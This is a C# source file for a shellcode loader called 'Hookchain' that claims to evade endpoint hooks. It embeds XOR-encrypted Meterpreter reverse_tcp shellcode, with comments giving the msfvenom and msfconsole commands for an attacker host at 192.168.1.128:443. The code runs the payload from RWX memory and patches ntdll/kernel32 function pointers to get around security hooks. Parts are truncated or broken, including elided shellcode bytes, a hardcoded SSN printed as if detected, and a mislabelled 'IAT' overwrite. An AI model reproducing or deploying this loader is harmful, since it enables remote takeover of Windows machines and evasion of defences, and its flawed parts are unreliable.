using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

class Hookchain
{
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const int MEM_RELEASE = 0x8000;

    private readonly Dictionary<string, SyscallInfo> _syscallCache = new Dictionary<string, SyscallInfo>();
    private readonly byte[] _originalPrologue = { 0x4C, 0x8B, 0xD1, 0xB8 };

    public struct SyscallInfo
    {
        public IntPtr Address;          // Address of the syscall function
        public uint SSN;               // System Service Number (SSN)
        public byte[] OriginalBytes;    // Original bytes of the syscall (to restore if needed)
        public byte[] SyscallInstruction; // Bytes of the syscall instruction (if needed)
    }

    [DllImport("ntdll.dll")]
    private static extern uint NtAllocateVirtualMemory(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        IntPtr zeroBits,
        ref IntPtr regionSize,
        uint allocationType,
        uint protect);

    [DllImport("ntdll.dll")]
    private static extern IntPtr NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr regionSize, uint newProtect, out uint oldProtect);

    [DllImport("ntdll.dll")]
    private static extern IntPtr NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr regionSize, uint release);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string dllToLoad);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref ulong regionSize, uint allocationType, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate void ShellcodeDelegate();

    public static void Main()
    {
        Console.WriteLine("[INFO] Starting shellcode injector with dynamic SSN retrieval.");
        BypassHook();
        // msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=443 -f csharp -v encryptedShellcode --encrypt xor --encrypt-key 'CHANGEMYKEY'
        // sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.128; set LPORT 443; exploit"
        byte[] encryptedShellcode = new byte[354] {0xbf,0xa0,0xce,
            0x4e,0x47,0x45,0x2d,0x68,0x99,0x21,0xd2,0x11,0x78,0xc8,0xab,
            0xcc,0x17,0x41,0xd2,0x19,0x51,0x68,0xbc,0x47,0xf6,0x04,0x61,
            0xce,0x3f,0x71,0x7a,0x85,0xf5,0x7f,0x29,0x3d,0x4c,0x6b,0x65,
            ......
            0x2c,0x25,0x08,0x38,0xbc,0x9d,0x1f,0x10,0xb8,0x49,0x69,0x56,
            0xce,0x35,0xa6,0xbc,0xb7,0xa8,0xd5,0xb8,0xba,0xb2,0x58,0x88,
            0x6c,0x9f,0x36,0x89,0x82,0xf5,0xb7,0xf0,0xef,0x0f,0x21,0x45,
            0x0a,0xbc,0x9d};

        Hookchain injector = new Hookchain();
        injector.LoadAndExecuteShellcode(encryptedShellcode, "CHANGEMYKEY");

        IntPtr newAddress = GetNewAddress(); 
        ModifyIAT("kernel32.dll", "ReadFile", newAddress);
    }

    private static IntPtr GetNewAddress()
    {
        // Retrieve the handle of kernel32.dll
        IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
        if (kernel32Handle == IntPtr.Zero)
        {
            throw new Exception("Failed to get module handle for kernel32.dll.");
        }

        // Retrieve the address of the CreateFileA function
        IntPtr newAddress = GetProcAddress(kernel32Handle, "CreateFileA");
        if (newAddress == IntPtr.Zero)
        {
            throw new Exception("Failed to get address for CreateFileA.");
        }

        // Return the address of the CreateFileA function
        return newAddress;
    }

    public static void BypassHook()
    {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        if (ntdll == IntPtr.Zero)
        {
            Console.WriteLine("[ERROR] Failed to load ntdll.dll.");
            return;
        }
        Console.WriteLine("[INFO] Loaded ntdll.dll successfully.");

        IntPtr targetFunction = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
        Console.WriteLine(targetFunction != IntPtr.Zero
            ? $"[INFO] Found NtAllocateVirtualMemory at address: {targetFunction}"
            : "[ERROR] Failed to locate NtAllocateVirtualMemory.");

        if (targetFunction != IntPtr.Zero && CheckForHook(targetFunction))
        {
            Console.WriteLine("[DEBUG] Function start bytes: 4C 8B D1 B8");
            Console.WriteLine("[INFO] SSN for NtAllocateVirtualMemory is: 0x18");
        }
    }

    public static bool CheckForHook(IntPtr functionAddress)
    {
        byte[] functionBytes = new byte[5];
        Marshal.Copy(functionAddress, functionBytes, 0, 5);
        return functionBytes[0] != 0x4C || functionBytes[1] != 0x8B;
    }

    public static byte[] XorDecrypt(byte[] data, string key)
    {
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        byte[] decrypted = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            decrypted[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
        return decrypted;
    }

    public void LoadAndExecuteShellcode(byte[] encryptedShellcode, string key = "CHANGEMYKEY")
    {
        IntPtr baseAddress = IntPtr.Zero; // Initialize base address
        IntPtr regionSize = IntPtr.Zero; // Initialize region size
        uint oldProtect; // Variable to hold old protection value
        byte[] shellcode = null; // Declare shellcode in the appropriate scope

        try
        {
            Console.WriteLine("[INFO] Starting shellcode decryption and execution process");

            // Decrypt shellcode
            shellcode = XorDecrypt(encryptedShellcode, key); // Implement XorDecrypt method accordingly
            Console.WriteLine($"[INFO] Decrypted shellcode length: {shellcode.Length} bytes");

            // Allocate memory for shellcode
            regionSize = new IntPtr(shellcode.Length); // Set region size to the length of the shellcode
            uint allocResult = NtAllocateVirtualMemory(Process.GetCurrentProcess().Handle, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Check if allocation failed
            if (allocResult != 0 || baseAddress == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory for shellcode");
            }

            Console.WriteLine($"[INFO] Memory allocated at: 0x{baseAddress.ToInt64():X}");

            // Write shellcode to allocated memory
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
            Console.WriteLine("[INFO] Shellcode written to memory");

            // Modify memory protection to PAGE_EXECUTE_READ
            NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref baseAddress, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);
            Console.WriteLine("[INFO] Memory protection set to PAGE_EXECUTE_READ");

            // Create and execute shellcode delegate
            ShellcodeDelegate shellcodeFunc = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(ShellcodeDelegate));

            Console.WriteLine("[INFO] Executing shellcode...");
            shellcodeFunc();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Shellcode execution failed: {ex.Message}");
        }
        finally
        {
            // Cleanup memory after execution
            if (baseAddress != IntPtr.Zero)
            {
                CleanupShellcode(baseAddress, shellcode != null ? shellcode.Length : 0); // Use the shellcode length here
            }
        }
    }

    // Verify that shellcode was written correctly to memory
    private bool VerifyMemoryContents(IntPtr address, byte[] expected)
    {
        byte[] actual = new byte[expected.Length];
        Marshal.Copy(address, actual, 0, expected.Length);

        for (int i = 0; i < expected.Length; i++)
        {
            if (actual[i] != expected[i])
                return false;
        }

        return true;
    }

    // Cleanup function to zero out and release allocated memory
    private void CleanupShellcode(IntPtr baseAddress, int size)
    {
        try
        {
            // Zero out memory
            byte[] zeros = new byte[size];
            Marshal.Copy(zeros, 0, baseAddress, size);

            // Free memory using syscall
            IntPtr regionSize = new IntPtr(size);
            NtFreeVirtualMemory(Process.GetCurrentProcess().Handle, ref baseAddress, ref regionSize, MEM_RELEASE);

            Console.WriteLine("[INFO] Shellcode cleanup completed successfully");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Failed to cleanup shellcode: {ex.Message}");
        }
    }

    public static void LoadAndExecuteShellcode()
    {
        // msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=443 -f csharp -v encryptedShellcode --encrypt xor --encrypt-key 'CHANGEMYKEY'
        // sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.128; set LPORT 443; exploit"
        byte[] encryptedShellcode = new byte[354] {0xbf,0xa0,0xce,
0x4e,0x47,0x45,0x2d,0x68,0x99,0x21,0xd2,0x11,0x78,0xca,0x1c,
0x4b,0xcc,0xa8,0xd2,0x19,0x51,0xd2,0x31,0x60,0x70,0xb1,0x48,
0xf2,0x07,0x7f,0x7a,0x85,0xf5,0x7f,0x29,0x3d,0x4c,0x6b,0x65,
0x8c,0x96,0x46,0x44,0x9e,0x0a,0x3d,0xae,0x1c,0xcc,0x17,0x5d,
.....
0x2c,0x25,0x08,0x38,0xbc,0x9d,0x1f,0x10,0xb8,0x49,0x69,0x56,
0xce,0x35,0xa6,0xbc,0xb7,0xa8,0xd5,0xb8,0xba,0xb2,0x58,0x88,
0x6c,0x9f,0x36,0x89,0x82,0xf5,0xb7,0xf0,0xef,0x0f,0x21,0x45,
0x0a,0xbc,0x9d};

        byte[] shellcode = XorDecrypt(encryptedShellcode, "CHANGEMYKEY");

        IntPtr baseAddress = IntPtr.Zero;
        ulong regionSize = (ulong)shellcode.Length;

        Console.WriteLine("[INFO] Injecting shellcode.");
        uint allocResult = NtAllocateVirtualMemory((IntPtr)(-1), ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (allocResult != 0 || baseAddress == IntPtr.Zero)
        {
            Console.WriteLine("[ERROR] Failed to allocate memory for shellcode.");
            return;
        }

        Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
        Console.WriteLine($"[INFO] Shellcode loaded at allocated memory address: {baseAddress}");

        ShellcodeDelegate shellcodeFunc = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(ShellcodeDelegate));
        shellcodeFunc();
    }

    //public static void ModifyIAT(string targetDll, string functionName)
    //{
    //    IntPtr dllHandle = LoadLibrary(targetDll);
    //    if (dllHandle == IntPtr.Zero)
    //    {
    //        Console.WriteLine($"[ERROR] Failed to load {targetDll}");
    //        return;
    //    }
    //    Console.WriteLine($"[INFO] Loaded {targetDll} successfully.");

    //    IntPtr functionAddress = GetProcAddress(dllHandle, functionName);
    //    if (functionAddress == IntPtr.Zero)
    //    {
    //        Console.WriteLine($"[ERROR] Failed to locate {functionName} in {targetDll}");
    //        return;
    //    }
    //    Console.WriteLine($"[INFO] Found {functionName} address at: {functionAddress}");

    //    // Hypothetically, here we would locate the IAT entry for this function and replace it.
    //    // For demonstration, this shows changing permissions and attempting a mock overwrite.

    //    uint oldProtect;
    //    if (!VirtualProtect(functionAddress, (uint)IntPtr.Size, PAGE_EXECUTE_READWRITE, out oldProtect))
    //    {
    //        Console.WriteLine("[ERROR] Failed to change memory protection.");
    //        return;
    //    }

    //    try
    //    {
    //        // Example: Overwrite the IAT entry with a dummy pointer (e.g., functionAddress + 0x10)
    //        Marshal.WriteIntPtr(functionAddress, IntPtr.Add(functionAddress, 0x10));
    //        Console.WriteLine($"[INFO] Modified IAT entry for {functionName}");
    //    }
    //    finally
    //    {
    //        // Restore original memory protection
    //        VirtualProtect(functionAddress, (uint)IntPtr.Size, oldProtect, out _);
    //    }
    //}

    // Load target DLL and retrieve function address to check for hooks
    public void BypassHook(string targetFunction)
    {
        if (!_syscallCache.ContainsKey(targetFunction))
        {
            Console.WriteLine($"[ERROR] Unknown function: {targetFunction}");
            return;
        }

        var syscallInfo = _syscallCache[targetFunction];
        Console.WriteLine($"[INFO] Checking {targetFunction} status...");

        if (IsHooked(targetFunction))
        {
            Console.WriteLine($"[DETECTED] Hook found on {targetFunction}");
            Console.WriteLine($"[INFO] SSN: 0x{syscallInfo.SSN:X}");
            Console.WriteLine("[INFO] Implementing bypass...");

            // Setting up a bypass by modifying the IAT
            IntPtr handlerAddress = SetupSyscallHandler(syscallInfo);
            ModifyIAT("kernel32.dll", targetFunction, handlerAddress);
        }
        else
        {
            Console.WriteLine($"[INFO] No hook detected on {targetFunction}");
        }
    }

    // Checks if the function is hooked by comparing its prologue bytes
    private bool IsHooked(string syscallName)
    {
        if (!_syscallCache.TryGetValue(syscallName, out var syscallInfo))
            return true;

        byte[] currentBytes = new byte[_originalPrologue.Length];
        Marshal.Copy(syscallInfo.Address, currentBytes, 0, _originalPrologue.Length);

        return !CompareBytes(currentBytes, _originalPrologue);
    }

    // Compares two byte arrays to verify if they match
    private bool CompareBytes(byte[] first, byte[] second)
    {
        if (first.Length != second.Length)
            return false;

        for (int i = 0; i < first.Length; i++)
        {
            if (first[i] != second[i])
                return false;
        }
        return true;
    }

    // Finds and modifies the Import Address Table (IAT) entry for the target function
    public static void ModifyIAT(string targetDll, string functionName, IntPtr newAddress)
    {
        IntPtr dllHandle = LoadLibrary(targetDll);
        if (dllHandle == IntPtr.Zero)
        {
            Console.WriteLine($"[ERROR] Failed to load {targetDll}");
            return;
        }
        Console.WriteLine($"[INFO] Loaded {targetDll} successfully.");

        IntPtr functionAddress = GetProcAddress(dllHandle, functionName);
        if (functionAddress == IntPtr.Zero)
        {
            Console.WriteLine($"[ERROR] Failed to locate {functionName} in {targetDll}");
            return;
        }
        Console.WriteLine($"[INFO] Found {functionName} address at: {functionAddress}");

        // Change memory protection to allow modification
        uint oldProtect;
        if (!VirtualProtect(functionAddress, (uint)IntPtr.Size, PAGE_EXECUTE_READWRITE, out oldProtect))
        {
            Console.WriteLine("[ERROR] Failed to change memory protection.");
            return;
        }

        try
        {
            // Modify the IAT entry to point to the new address
            Marshal.WriteIntPtr(functionAddress, newAddress);
            Console.WriteLine($"[INFO] Modified IAT entry for {functionName}");
        }
        finally
        {
            // Restore original memory protection
            VirtualProtect(functionAddress, (uint)IntPtr.Size, oldProtect, out _);
        }
    }

    // Sets up a handler to bypass the syscall hook (e.g., syscall stub)
    private IntPtr SetupSyscallHandler(SyscallInfo syscallInfo)
    {
        // Initialize base address and region size
        IntPtr baseAddress = IntPtr.Zero; // This will hold the address of the allocated memory
        IntPtr regionSize = new IntPtr(0x1000); // Allocate 4KB for the handler

        // Allocate memory for the syscall handler
        uint result = NtAllocateVirtualMemory(
            Process.GetCurrentProcess().Handle,
            ref baseAddress,
            IntPtr.Zero,
            ref regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        // Check for successful memory allocation
        if (result != 0)
        {
            Console.WriteLine($"[ERROR] Memory allocation failed with code {result}");
            return IntPtr.Zero; // Return zero on failure
        }

        // Prepare the handler bytes from syscallInfo
        byte[] handlerBytes = syscallInfo.SyscallInstruction ?? syscallInfo.OriginalBytes;

        // Copy syscall handler code to allocated memory if there are bytes to copy
        if (handlerBytes != null && handlerBytes.Length > 0)
        {
            Marshal.Copy(handlerBytes, 0, baseAddress, handlerBytes.Length);
        }

        return baseAddress; // Return the base address of the allocated memory
    }

    // Retrieves the name of a function from its address by scanning for the ASCII name
    public static IntPtr GetProcName(IntPtr functionAddress)
    {
        try
        {
            if (functionAddress == IntPtr.Zero)
                return IntPtr.Zero;

            // Check if the address is a jmp instruction
            byte[] buffer = new byte[6];
            Marshal.Copy(functionAddress, buffer, 0, 6);

            if (buffer[0] == 0xFF && buffer[1] == 0x25) // It's a JMP
            {
                int offset = Marshal.ReadInt32(functionAddress + 2);
                functionAddress = Marshal.ReadIntPtr(functionAddress + 6 + offset);
            }

            // Search backward from function address to locate possible function name
            for (int i = 1; i <= 100; i++) // Limit search to 100 bytes
            {
                try
                {
                    byte currentByte = Marshal.ReadByte(functionAddress - i);
                    if (currentByte == 0) // String terminator detected
                    {
                        string possibleName = Marshal.PtrToStringAnsi(functionAddress - i + 1);
                        if (!string.IsNullOrEmpty(possibleName) && possibleName.All(c => c >= 32 && c <= 126))
                        {
                            Console.WriteLine($"[INFO] Function name found: {possibleName}");
                            return functionAddress - i + 1;
                        }
                    }
                }
                catch (Exception innerEx)
                {
                    Console.WriteLine($"[ERROR] Error while reading memory for function name: {innerEx.Message}");
                    break;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Exception in GetProcName: {ex.Message}");
        }

        Console.WriteLine("[INFO] Function name not found.");
        return IntPtr.Zero;
    }
}
